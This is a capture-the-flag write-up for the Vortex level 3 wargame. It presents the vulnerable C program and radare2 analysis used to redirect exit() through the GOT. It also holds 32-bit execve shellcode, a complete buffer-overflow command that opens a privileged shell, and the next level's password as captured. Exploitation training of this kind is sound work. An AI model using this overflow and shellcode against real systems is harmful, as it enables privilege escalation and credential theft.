@@ -1,0 +1,89 @@
+The source: -
+
+	int main(int argc, char **argv)
+	{
+		unsigned long **lpp = &lp, *tmp;
+		char buf[128];
+
+		if (argc != 2)
+			exit(1);
+
+		strcpy(buf, argv[1]);
+
+		if (((unsigned long) lpp & 0xffff0000) != 0x08040000)
+			exit(2);
+
+		tmp = *lpp;
+		**lpp = (unsigned long) &buf;    //  [1]
+		// *lpp = tmp; // Fix suggested by Michael Weissbacher @mweissbacher 2013-06-30
+
+		exit(0);       //   [2]
+	}
+
+
+In the vortex3 we see that it dereferences lpp twice and sets it to the address of the buf (see [1]).
+So if we can direct execution to **lpp and we have shellcode in buf we win
+So we need something that when derefenced twice effects execution control.
+We see that after the **lpp = &buf; there is a call to exit(0) (see [2]); if we can replace the exit(0) we win.
+
+Using radare2 we take a look at the exit call: -
+
+	[0x080485df]> pdf @sym.imp.exit
+		|   ;-- hit1_1:
+		|   ;-- hit2_24:
+	/ (fcn) sym.imp.exit 16
+	|       |   ; CALL XREF from 0x080484b2 (sym.imp.exit)
+	|       |   ; CALL XREF from 0x08048487 (sym.imp.exit)
+	|       |   ; CALL XREF from 0x08048451 (sym.imp.exit)
+	|       |   0x08048310  ~   ff2534970408   jmp dword [reloc.exit_52]   ; reloc.exit_52
+	|       |   0x08048316      6810000000     push 0x10
+	\       `=< 0x0804831b      e9c0ffffff     jmp section..plt
+
+
+Searching for the address: -
+
+	[0x080485df]> axt reloc.exit_52
+	d 0x8048310 jmp dword [reloc.exit_52] in sym.imp.exit
+
+
+Only the exit@plt, lets try harder: -
+
+	[0x080485df]> ? reloc.exit_52
+	134518580 0x8049734 01001113464 128.3M 804000:0734 134518580 00110100 134518580.0 0.000000f 0.000000
+
+	[0x080485df]> /x 34970408
+	Searching 4 bytes...
+	# 7 [0x8048000-0x8049750]
+	hits: 2
+	0x080482a4 hit3_0 34970408
+	0x08048312 hit3_1 34970408
+
+So if we overflow buf and write over lpp with the address 0x080482a4 or 0x08048312, then when it's derefernced twice it will get 0x080482a4 -> 0x8049734 -> &buff, or in pseduo C/Assembly: -
+
+    lpp = 0x080482a4;                 // from strcpy overflow
+    *lpp = reloc.exit_52 = 0x8049734; // from .rel.plt
+    **lpp = &buf;                     // from code
+        // and when exit() is called
+    jmp dword [reloc.exit_52];        // jmp &buf (our shellcode)
+
+
+what shellcode? Lets use Radare2 again: -
+
+	vortex3@melinda:~$ ragg2  -b 32  -i exec
+	31c050682f2f7368682f62696e89e3505389e199b00bcd80
+
+
+It's 48 chars, so 24 bytes, let's reformat it for Python/C: -
+
+	echo 31c050682f2f7368682f62696e89e3505389e199b00bcd80 | sed -e 's/\(..\)/\\x\1/g'
+	\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
+
+
+Putting it all together, with 4 bytes of padding to get the right var, and correct endianess: -
+
+	vortex3@melinda:/vortex$ ./vortex3 $(python -c 'print "\x90"*(128-24) + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + "PPPP\xa4\x82\x04\x08"')
+	$ id
+	uid=5003(vortex3) gid=5003(vortex3) euid=5004(vortex4) groups=5004(vortex4),5003(vortex3)
+	$ cat /etc/vortex_pass/vortex4
+	2YmgK1=jw
+	$
